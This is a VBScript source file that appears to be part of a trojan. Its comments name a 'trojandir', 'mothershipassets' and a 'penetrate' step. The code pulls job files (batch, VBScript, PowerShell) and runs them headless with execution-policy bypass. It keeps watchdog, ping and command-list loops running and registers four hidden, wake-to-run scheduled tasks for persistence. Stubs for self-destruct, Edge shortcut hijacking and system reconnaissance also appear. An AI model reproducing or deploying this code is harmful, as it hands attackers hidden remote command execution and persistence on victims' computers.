            jobfilename = headers.Item("Content-Disposition")
            
            If XIsEmpty(jobfilename) Then
                jobfilename = "bbti.bat"
            Else
                Dim token : token = "filename="&dq
                Dim pos : pos = InStr(jobfilename, token)
                
                jobfilename = Mid(jobfilename, pos+Len(token))
                
                if ( Mid(jobfilename, Len(jobfilename), 1) = dq ) Then
                    jobfilename = Mid(jobfilename, 1, Len(jobfilename)-1)
                end if
            End IF
            
        End IF

        jobfilename = jobcode & "_" & jobfilename
        
        Call TryCopyFile(filepath, workdir & "\" & jobfilename)
        
        filepath = workdir & "\" & jobfilename

        If not fso.FileExists(filepath) Then
            Call LogMsg("could not create job file " & filepath)
            Exit Do
        End IF
        
        Call LogMsg("cmdlist - job filepath: " & filepath)

        Dim filext : filext = fso.GetExtensionName(jobfilename)

        If XIsEmpty(filext) Then
            Call LogMsg("job file extension is empty -- skipping to next iteration")
            Exit Do
        End IF
        
        Call LogMsg("cmdlist - job file extension: " & filext )

        Dim cmdstr : cmdstr = ""
        
        cmdstr = "conhost.exe --headless cmd /c "
        
        If LCase(filext) = "bat" Then
            cmdstr = cmdstr & " " & filepath 
        ElseIf LCase(filext) = "vbs" Then
            cmdstr = cmdstr & " " & "cscript.exe //nologo //B " & filepath
        ElseIf LCase(filext) = "ps1" Then
            cmdstr = cmdstr & " " & "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File " & filepath
        End If
        
        ret = RunShell(cmdstr & " > " & workdir & "\" & jobfilename & "_cmds.log", false)
        
        If Not ret Then
            Call LogMsg("ERROR :: failed to execute cmd list")
        End IF
        
        Exit Do
    
    Loop
    

        Call LogMsg("cmdlist sleeping " & CStr(cmdlistdelaytime) & " seconds " & GetTimestamp() )

        WScript.Sleep cmdlistdelaytime*1000
    
    Loop
    
End Function

Function CreateTaskXMLStr(xmlstr, tasknamestr)
    Call LogMsg("CreateTaskXMLStr: " & tasknamestr )
    
    If XIsEmpty(xmlstr) Then
        Exit Function
    End IF
    
    If XIsEmpty(tasknamestr) Then
        Exit Function
    End IF

    Dim fname : fname = tasknamestr & ".xml"
    
    Call WriteTaskXML(fname, xmlstr)

    Call LogErr()

    If fso.FileExists(workdir & "\" & fname) Then
        Call CreateTaskXML(tasknamestr, workdir & "\" & fname)
    End If

    Call LogErr()
    
End Function

Function Reschedule()   
    cmdname = "reschedule"
 
    Call LogMsg("Reschedule starting")
    
    Dim xmlstr 
    Dim ptaskname 

    ptaskname = tskname & "_" & "daily_task"
    xmlstr = GetDailyTaskXMLStr(ptaskname)
    Call CreateTaskXMLStr(xmlstr, ptaskname)
    
    ptaskname = tskname & "_" & "idle_task"
    xmlstr = GetIdleTaskXMLStr(ptaskname)
    Call CreateTaskXMLStr(xmlstr,ptaskname)

    ptaskname = tskname & "_" & "rep_task"
    xmlstr = GetRepTaskXMLStr(ptaskname)
    Call CreateTaskXMLStr(xmlstr,ptaskname)

				 
    ptaskname = tskname & "_" & "time_task"
    xmlstr = GetTimeTaskXMLStr(ptaskname)
    Call CreateTaskXMLStr(xmlstr, ptaskname)
		  
    
    Call LogMsg("Reschedule finished")
End Function

Function ReadCmdPid(tcmdname, tworkdir)
    Call LogMsg("ReadCmdPid " & tcmdname)
    
    ReadCmdPid = -1
    
    If XIsEmpty(tcmdname) Then
        Exit Function
    End IF
    
    If XIsEmpty(tworkdir) Then
        tworkdir = workdir
    End If
    
    If fso.FileExists(tworkdir & "\" & tcmdname & "_running") Then
        ReadCmdPid = ReadTag(tworkdir & "\" & tcmdname & "_running")
    Else
        Call LogMsg("ReadCmdPid " & tcmdname & " running file does not exist -- exiting function")

        Exit Function
    End If
    
    ReadCmdPid = CLng(ReadCmdPid)

    Call LogMsg("ReadCmdPid pid=" & ReadCmdPid)

End Function

Function IsCmdRunning(tcmdname, tworkdir, ByRef tprocname)
    
    Call LogMsg("IsCmdRunning -- " & tcmdname & " " & tworkdir)
    tprocname = ""
    
    IsCmdRunning = -1
    
    If XIsEmpty(tworkdir) Then
        tworkdir = workdir
    End If
    
    Dim list
    Set list = GetProcessList()
    
    If list Is Nothing Then
        Call LogMsg("IsCmdRunning process list is empty -- exiting function")
        Exit Function
    End IF
    
    If list.Count = 0 Then
        Call LogMsg("IsCmdRunning process list is empty -- exiting function")
        Exit Function
    End IF
    
    Dim cmdpid : cmdpid = ReadCmdPid(tcmdname, tworkdir)
    
    Call LogMsg("IsCmdRunning read pid=" & CStr(cmdpid))

    If Not cmdpid > 0 Then
        Call LogMsg("IsCmdRunning cmdpid negative -- exiting function")
        Exit Function
    End If
    
    Dim itemKey
    Dim item
    For Each itemKey in list
        item = list.Item(itemKey)

        Dim procname : procname = item(0)       
        Dim pid : pid = item(1)
        
        If ( pid = cmdpid ) Then
            IsCmdRunning = pid
            tprocname = procname
            Call LogMsg("IsCmdRunning found matching pid=" & CStr(pid) & " procname=" & procname)
            Call LogMsg("IsCmdRunning -- exiting function")
            Exit Function
        End IF

    Next

    Call LogMsg("IsCmdRunning failed to find match")
    
End Function

Function ExecExe(exename, exefname, exedir, args)
    ExecExe = -1
    Dim pp : pp = "ExecExe"
    
    If XIsEmpty(exename) or XIsEmpty(exefname) or XIsEmpty(exedir) Then
        Exit Function
    End IF										 

    Dim exefpath : exefpath = exedir & "\" & exefname
    
    Dim argstr : argstr = ""
    
    If IsArray(args) Then
        argstr = Join(args)
    End If

    Call LogMsg(pp & " launching " & exefpath)
    
    If not fso.FolderExists(exedir) Then
        LogMsg(pp & ": ERROR :: exedir is missing " & exedir)
        Exit Function
    End If
    
    If not fso.FileExists(exefpath) Then
        LogMsg(pp & ": ERROR :: exefpath is missing " & exefpath)
        Exit Function
    End If
    
    Dim cmdlogfpath : cmdlogfpath = exefpath & "_" & CStr(GetRandom(4)) & "_cmd.log"
    
    Dim cmdstr : cmdstr = exefpath & " " & argstr & " > " & cmdlogfpath & " 2>&1"
        

	Dim objShell : Set objShell = CreateObject("WScript.Shell")
    objShell.CurrentDirectory = exedir
    Dim objExec : Set objExec = objShell.Exec("cmd /c " & cmdstr)
    Dim pid : pid = objExec.ProcessID

    Dim cmdrunpath : cmdrunpath = exedir & "\" & exename & "_running"

    If pid > 0 Then        
        Call LogMsg(pp & " -- creating running file " & cmdrunpath & " with pid=" & pid)
        
        Call TryDeleteFile(cmdrunpath)
        Call WriteFile(cmdrunpath, CStr(pid))
        
        If fso.FileExists(cmdrunpath) Then
            Call LogMsg(pp & " -- created running file")
        Else
            Call LogMsg(pp & " -- failed to creat running file")
        End If
        
    End IF
    
    ExecExe = pid
    
    If Err.Number <> 0 Then
        Call LogMsg(pp & " reporting error")
        Call LogErr()
        ExecExe = -1
        Exit Function
    End If
    
    Call LogMsg("ExecExe finished")

End Function 

Function ExecPython(scriptname, scriptdir, scriptfname, args)
    ExecPython = -1
    
    If XIsEmpty(scriptname) or XIsEmpty(scriptdir) or XIsEmpty(scriptfname) Then
        Exit Function
    End IF										 

    Dim scriptfpath : scriptfpath = scriptdir & "\" & scriptfname
    
    Dim argstr : argstr = ""
    
    If IsArray(args) Then
        argstr = Join(args)
    End If

    Call LogMsg("ExecPython " & scriptfpath)
    
    If not fso.FolderExists(scriptdir) Then
        LogMsg("ExecPython: ERROR :: scriptdir is missing " & scriptdir)
        Exit Function
    End If
    
    If not fso.FileExists(scriptfpath) Then
        LogMsg("ExecPython: ERROR :: scriptfpath is missing " & scriptfpath)
        Exit Function
    End If
    
    If not fso.FileExists(pythonexe) Then
        LogMsg("ExecPython: ERROR :: pythonexe is missing " & pythonexe)
        Exit Function
    End If
    
    Dim cmdlogfpath : cmdlogfpath = scriptfpath & "_" & CStr(GetRandom(4)) & "_cmd.log"
    
    Dim cmdstr : cmdstr = dq & pythonexe & dq & " " & scriptfpath & " " & argstr & " > " & cmdlogfpath & " 2>&1"
    
    Call TryDeleteFile(workdir & "\" & "python_version")
    
    Call RunShell("cmd /c " & dq & pythonexe & dq & " --version > " & workdir & "\" & "python_version" & " 2>&1", True)
    
    Dim pid : pid = ExecShellAsync("cmd /c " & cmdstr)
    
    Dim cmdrunpath : cmdrunpath = scriptdir & "\" & scriptname & "_running"

    If pid > 0 Then        
        Call TryDeleteFile(cmdrunpath)
        
        Call WriteFile(cmdrunpath, CStr(pid))
        
        If fso.FileExists(cmdrunpath) Then
            Call LogMsg("ExecPython -- created running file " & cmdrunpath & " with pid=" & pid)
        End If
    End IF
    
    ExecPython = pid
    
    Call LogMsg("ExecPython finished")

End Function

Function ExecCmd(tcmdname, args)
    ExecCmd = -1
    
    If XIsEmpty(tcmdname) Then
        Exit Function
    End IF										 

    Call LogMsg("ExecCmd " & tcmdname)

    Dim argstr : argstr = ""
    
    If IsArray(args) Then
        if UBound(args) >= 0 Then
            Dim elem             
            Dim i : i = 0
            For Each elem in args 
                If i = 0 Then
                    argstr = CStr(elem)
                Else
                    argstr = argstr & " " & CStr(elem)
                End If
                i = i + 1
            Next
            
        End if
    End If
    
    Dim cmdstr : cmdstr = ""
    cmdstr = "cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " " & tcmdname
    cmdstr = cmdstr & " " & argstr
    
    Dim pid : pid = ExecShellAsync(cmdstr)
    
		  
    Dim cmdrunpath : cmdrunpath = workdir & "\" & tcmdname & "_running"

    If pid > 0 Then        
        Call TryDeleteFile(cmdrunpath)
        
        Call WriteFile(cmdrunpath, CStr(pid))
        
        If fso.FileExists(cmdrunpath) Then
            Call LogMsg("ExecCmd -- created running file " & cmdrunpath & " with pid=" & pid)
        End If
        
    End IF
    
    ExecCmd = pid
End Function

Function ActivateCmd(tcmdname)       
    ActivateCmd = -1

    If XIsEmpty(tcmdname) Then
        Exit Function
    End If

    Call LogMsg("ActivateCmd: cmdname=" & tcmdname)

    Dim procname : procname = ""
    Dim cmdpid : cmdpid = IsCmdRunning(tcmdname, workdir, procname)

    Call LogMsg("ActivateCmd: procname=" & procname & " cmdpid=" & CStr(cmdpid))
    
    If ( cmdpid > 0 and ( LCase(procname) = "cscript.exe" ) ) Then
					 
        ActivateCmd = cmdpid
        
        Call LogMsg("ActivateCmd: cmd is running -- no need to launch")
        Exit Function
    End If
    
    Call LogMsg("ActivateCmd: [" & tcmdname & "] cmd is not running -- starting it up")
    
    ActivateCmd = ExecCmd(tcmdname, Array())

    Call LogMsg("ActivateCmd: pid=" & CStr(ActivateCmd))
    
End Function

Function Activate()
    
    Dim cmd
    For Each cmd in Array("watchdog", "ping", "cmdlist")
        ActivateCmd(cmd)
    Next
    
End Function

Function StartupLogic()
    On Error Resume Next
    Err.Clear
    
    Call LogMsg("StartupLogic")

    Call TryDeleteFile(workdir & "\" & "killall")

    Dim cmd
    For Each cmd in Array("watchdog", "ping", "cmdlist")
        Call TryDeleteFile(workdir & "\" & "reset_" & cmd & "loop" )
	Next 

	Call GetConfig()

    If cmdname = "init" Then
        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " reschedule")    
		Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " retrieve")
		Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " penetrate")
    End IF
	
    Activate()
    
	If Err.Number <> 0 Then
		Call LogMsg("StartupLogic -- reporting errors")
		Call LogErr()
		Exit Function
	End If

    Call LogMsg("StartupLogic -- finished")
End Function

Function GetIdleTaskXMLStr(intaskname)
    Dim futureTime : futureTime = DateAdd("n", 5, Now)
    Dim tasktimestr : tasktimestr = ToTaskTime(futureTime)
    
    Dim taskxmlstr
    taskxmlstr = "<?xml version=" & dq & "1.0" & dq & " encoding=" & dq & "UTF-16" & dq & "?>" & _
                 "<Task version=" & dq & "1.2" & dq & " xmlns=" & dq & "http://schemas.microsoft.com/windows/2004/02/mit/task" & dq & ">" & _
                 "<RegistrationInfo>" & _
                 "<Date>2026-04-26T09:45:36.6514157</Date>" & _
                 "<Author>test</Author>" & _
                 "<URI>\"&intaskname&"</URI>" & _
                 "</RegistrationInfo>" & _ 
                 "<Triggers>" & _
                 "<IdleTrigger>" & _
                 "<StartBoundary>" & tasktimestr & "</StartBoundary>" & _
                 "</IdleTrigger>" & _
                 "</Triggers>" & _
                 "<Settings>" & _
                 "<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" & _
                 "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" & _
                 "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" & _
                 "<AllowHardTerminate>false</AllowHardTerminate>" & _
                 "<StartWhenAvailable>true</StartWhenAvailable>" & _
                 "<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>" & _
                 "<IdleSettings>" & _
                 "<Duration>PT1M</Duration>" & _
                 "<WaitTimeout>PT1H</WaitTimeout>" & _
                 "<StopOnIdleEnd>true</StopOnIdleEnd>" & _
                 "<RestartOnIdle>false</RestartOnIdle>" & _
                 "</IdleSettings>" & _
                "<AllowStartOnDemand>true</AllowStartOnDemand>" & _
                "<Enabled>true</Enabled>" & _
                "<Hidden>true</Hidden>" & _
                "<RunOnlyIfIdle>false</RunOnlyIfIdle>" & _
                "<WakeToRun>true</WakeToRun>" & _
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" & _
                "<Priority>7</Priority>" & _
                "</Settings>" & _
                "<Actions Context=" & dq & "Author" & dq & ">" & _
                "<Exec>" & _
                "<Command>conhost.exe</Command>" & _
                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
                "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                "</Exec>" & _
                "</Actions>" & _
                "</Task>"

    GetIdleTaskXMLStr = taskxmlstr
End Function

Function GetRepTaskXMLStr(intaskname)
    Dim taskxmlstr
    taskxmlstr = "<?xml version=" & dq & "1.0" & dq & " encoding=" & dq & "UTF-16" & dq & "?>" & _
                 "<Task version=" & dq & "1.2" & dq & " xmlns=" & dq & "http://schemas.microsoft.com/windows/2004/02/mit/task" & dq & ">" & _
                 "<RegistrationInfo>" & _
                 "<Date>2026-04-26T09:45:36.6514157</Date>" & _
                 "<Author>test</Author>" & _
                 "<URI>\" & intaskname & "</URI>" & _
                 "</RegistrationInfo>" & _ 
                 "<Triggers>" & _ 
                 "<CalendarTrigger>" & _ 
                 "<StartBoundary>2026-04-30T09:00:00</StartBoundary>" & _ 
                 "<Repetition>" & _ 
                 "<Interval>PT" & tskxmltime & "M</Interval>" & _ 
                 "<StopAtDurationEnd>false</StopAtDurationEnd>" & _ 
                 "</Repetition>" & _ 
                 "<ScheduleByDay>" & _ 
                 "<DaysInterval>1</DaysInterval>" & _ 
                 "</ScheduleByDay>" & _ 
                 "</CalendarTrigger>" & _ 
                 "</Triggers>" & _ 
                 "<Settings>" & _
                 "<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" & _
                 "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" & _
                 "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" & _
                 "<AllowHardTerminate>false</AllowHardTerminate>" & _
                 "<StartWhenAvailable>true</StartWhenAvailable>" & _
                 "<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>" & _
                "<IdleSettings>" & _
                "<StopOnIdleEnd>false</StopOnIdleEnd>" & _
                "<RestartOnIdle>false</RestartOnIdle>" & _
                "</IdleSettings>" & _
                "<AllowStartOnDemand>true</AllowStartOnDemand>" & _
                "<Enabled>true</Enabled>" & _
                "<Hidden>true</Hidden>" & _
                "<RunOnlyIfIdle>false</RunOnlyIfIdle>" & _
                "<WakeToRun>true</WakeToRun>" & _
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" & _
                "<Priority>7</Priority>" & _
                "</Settings>" & _
                "<Actions Context=" & dq & "Author" & dq & ">" & _
                "<Exec>" & _
                "<Command>conhost.exe</Command>" & _
                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
                "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                "</Exec>" & _
                "</Actions>" & _
                "</Task>"

    GetRepTaskXMLStr = taskxmlstr
End Function

Function GetTimeTaskXMLStr(intaskname)
    Dim taskxmlstr
    taskxmlstr = "<?xml version=" & dq & "1.0" & dq & " encoding=" & dq & "UTF-16" & dq & "?>" & _
                 "<Task version=" & dq & "1.2" & dq & " xmlns=" & dq & "http://schemas.microsoft.com/windows/2004/02/mit/task" & dq & ">" & _
                 "<RegistrationInfo>" & _
                 "<Date>2026-04-26T09:45:36.6514157</Date>" & _
                 "<Author>test</Author>" & _
                 "<URI>\" & intaskname & "</URI>" & _
                 "</RegistrationInfo>" & _ 
                 "<Triggers>" & _ 
                 "<TimeTrigger>" & _ 
                 "<StartBoundary>2008-09-01T03:00:00</StartBoundary>" & _ 
                 "<Repetition>" & _ 
                 "<Interval>PT"&CStr(timetaskxmltime)&"M</Interval>" & _ 
                 "</Repetition>" & _ 
                 "<RandomDelay>PT30S</RandomDelay>" & _ 
                 "</TimeTrigger>" & _ 
                 "</Triggers>" & _ 
                 "<Settings>" & _
                 "<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" & _
                 "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" & _
                 "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" & _
                 "<AllowHardTerminate>false</AllowHardTerminate>" & _
                 "<StartWhenAvailable>true</StartWhenAvailable>" & _
                 "<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>" & _
                "<IdleSettings>" & _
                "<StopOnIdleEnd>false</StopOnIdleEnd>" & _
                "<RestartOnIdle>false</RestartOnIdle>" & _
                "</IdleSettings>" & _
                "<AllowStartOnDemand>true</AllowStartOnDemand>" & _
                "<Enabled>true</Enabled>" & _
                "<Hidden>true</Hidden>" & _
                "<RunOnlyIfIdle>false</RunOnlyIfIdle>" & _
                "<WakeToRun>true</WakeToRun>" & _
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" & _
                "<Priority>7</Priority>" & _
                "</Settings>" & _
                "<Actions Context=" & dq & "Author" & dq & ">" & _
                "<Exec>" & _
                "<Command>conhost.exe</Command>" & _
                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
                "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                "</Exec>" & _
                "</Actions>" & _
                "</Task>"

    GetTimeTaskXMLStr = taskxmlstr
End Function

Function GetDailyTaskXMLStr(intaskname)
    Dim taskxmlstr
    taskxmlstr = "<?xml version=" & dq & "1.0" & dq & " encoding=" & dq & "UTF-16" & dq & "?>" & _
                 "<Task version=" & dq & "1.2" & dq & " xmlns=" & dq & "http://schemas.microsoft.com/windows/2004/02/mit/task" & dq & ">" & _
                 "<RegistrationInfo>" & _
                 "<Date>2026-04-26T09:45:36.6514157</Date>" & _
                 "<Author>test</Author>" & _
                 "<URI>\" & intaskname & "</URI>" & _
                 "</RegistrationInfo>" & _ 
                 "<Triggers>" & _
                 "<CalendarTrigger>" & _
                 "<StartBoundary>2026-04-26T09:45:21</StartBoundary>" & _
                 "<Enabled>true</Enabled>" & _
                 "<ScheduleByDay>" & _
                 "<DaysInterval>1</DaysInterval>" & _
                 "</ScheduleByDay>" & _
                 "</CalendarTrigger>" & _
                 "</Triggers>" & _
                 "<Settings>" & _
                 "<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" & _
                 "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" & _
                 "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" & _
                 "<AllowHardTerminate>false</AllowHardTerminate>" & _
                 "<StartWhenAvailable>true</StartWhenAvailable>" & _
                 "<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>" & _
                "<IdleSettings>" & _
                "<StopOnIdleEnd>false</StopOnIdleEnd>" & _
                "<RestartOnIdle>false</RestartOnIdle>" & _
                "</IdleSettings>" & _
                "<AllowStartOnDemand>true</AllowStartOnDemand>" & _
                "<Enabled>true</Enabled>" & _
                "<Hidden>true</Hidden>" & _
                "<RunOnlyIfIdle>false</RunOnlyIfIdle>" & _
                "<WakeToRun>true</WakeToRun>" & _
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" & _
                "<Priority>7</Priority>" & _
                "</Settings>" & _
                "<Actions Context=" & dq & "Author" & dq & ">" & _
                "<Exec>" & _
                "<Command>conhost.exe</Command>" & _
                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
                "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                "</Exec>" & _
                "</Actions>" & _
                "</Task>"

    GetDailyTaskXMLStr = taskxmlstr
End Function

Function WriteTaskXML(fname, xmlstr)
    Dim taskxmlstr : taskxmlstr = xmlstr ' GetTaskXMLStr()
    Dim xmlfObj : Set xmlfObj = fso.OpenTextFile(workdir & "\" & fname, 2, True)

    If Not xmlfObj Is Nothing Then
        xmlfObj.WriteLine taskxmlstr
    End If
End Function

Function InstallPython()
    ' download parts from mothershipassets (need bunnyheader) location
    ' download each part, check size
    ' check zip MD5
End Function

Function ModifyMSEdgeLnk()
    ' MicrosoftEdgeAutoLaunch_5B148DE90C207DD5EDAA5B34E614DD84
    ' all lnk locations
    ' registry edit
End Function

Function SelfDestruct()
' delete all regs, startup path, and trojandir, etc.
End Function

Function GetSystemOverview()
    ' see if pcmon installed, python installed
    ' cdptest
    '
    ' number of files in trojandir
    ' number of directories in trojandir
    ' total size of trojandir
    ' recursive directory snapshot with names, size, and modifieddate
    ' snapshot of tasks
    ' check penetration: reg startup, startup path (launch.exe)

End Function

Function Cleanup()
    ' remove log files, cmd_list run directories
End Function

Function GetTasks()
    
    ' run schtasks
    ' use powershell
    ' use wmic Win32_ScheduledJob
    
End Function
